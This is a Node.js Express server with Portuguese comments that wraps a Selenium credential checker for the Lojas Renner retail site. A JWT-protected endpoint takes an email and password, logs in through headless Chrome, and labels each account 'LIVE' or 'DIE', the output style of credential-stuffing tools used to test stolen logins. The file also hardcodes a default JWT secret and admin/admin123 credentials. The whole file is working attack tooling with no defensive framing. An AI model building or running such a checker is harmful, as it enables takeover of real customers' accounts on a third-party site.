import express from 'express';
import { Builder, By, until } from 'selenium-webdriver';
import chrome from 'selenium-webdriver/chrome.js';
import bodyParser from 'body-parser';
import jwt from 'jsonwebtoken'; // Adiciona JWT
import picocolors from 'picocolors';

const app = express();
const port = 4000;

const JWT_SECRET = process.env.JWT_SECRET || 'seuSegredoAqui'; // Define um segredo para o JWT

// Middleware para processar JSON
app.use(bodyParser.json());

// Middleware de autenticação JWT
const authenticateJWT = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1]; // Extrai o token do cabeçalho

    if (!token) {
        return res.status(403).json({ message: 'Acesso negado, token não fornecido.' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ message: 'Token inválido ou expirado.' });
        }
        req.user = user; // Adiciona o usuário ao objeto de requisição
        next();
    });
};

// Endpoint para login (gera o token JWT)
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Aqui você pode fazer a verificação do username e senha, por exemplo, consultando um banco de dados
    if (username === 'admin' && password === 'admin123') { // Exemplo simples de autenticação
        // Gera um token JWT válido por 1 hora
        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
        return res.json({ token });
    } else {
        return res.status(401).json({ message: 'Credenciais inválidas.' });
    }
});

// Endpoint para verificar login na Renner, protegido por JWT
app.post('/api/check-renner', authenticateJWT, async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email e senha são obrigatórios' });
    }

    let options = new chrome.Options();
    options.addArguments('--log-level=3');
    options.addArguments('--disable-logging');
    options.addArguments('--disable-gpu');
    options.addArguments('--headless'); // Rodar o Chrome sem interface gráfica

    let driver = await new Builder().setChromeOptions(options).forBrowser('chrome').build();

    try {
        // Navegar até a página principal da Renner
        await driver.get('https://www.lojasrenner.com.br/');

        // Clicar no botão de login
        let bntPageLogin = await driver.wait(until.elementLocated(By.className('user-info')), 10000);
        await bntPageLogin.click();

        // Inserir email e senha
        let inputEmail = await driver.wait(until.elementLocated(By.name('login')), 10000);
        let inputPassw = await driver.wait(until.elementLocated(By.name('password')), 10000);
        let loginButton = await driver.wait(until.elementLocated(By.className('Button_button__vcDFE Button_medium__2sh2z')), 10000);

        await inputEmail.sendKeys(email);
        await inputPassw.sendKeys(password);

        await driver.sleep(2000);

        // Clicar no botão de login
        await loginButton.click();

        await driver.sleep(5000);

        // Verificar se o login foi bem-sucedido
        let textElement = await driver.wait(until.elementLocated(By.tagName('body')), 10000);
        let text = await textElement.getText();

        if (text.includes('Esta combinação de usuário e senha é inválida.')) {
            console.log(picocolors.red(`[ DIE ] » ${email} » [ Login inválido ]`));
            return res.json({ status: 'DIE', message: `Login inválido para o email: ${email}` });
        } else {
            console.log(picocolors.green(`[ LIVE ] » ${email} » [ Login válido ]`));
            return res.json({ status: 'LIVE', message: `Login bem-sucedido para o email: ${email}` });
        }

    } catch (error) {
        console.error(picocolors.red(`[ ERROR ] » ${email} » [ Erro ao tentar fazer login: ${error.message} ]`));
        return res.status(500).json({ error: `Erro ao tentar fazer login: ${error.message}` });
    } finally {
        await driver.quit();
    }
});

// Iniciar o servidor
app.listen(port, () => {
    console.log(`API da Renner rodando em http://localhost:${port}`);
});
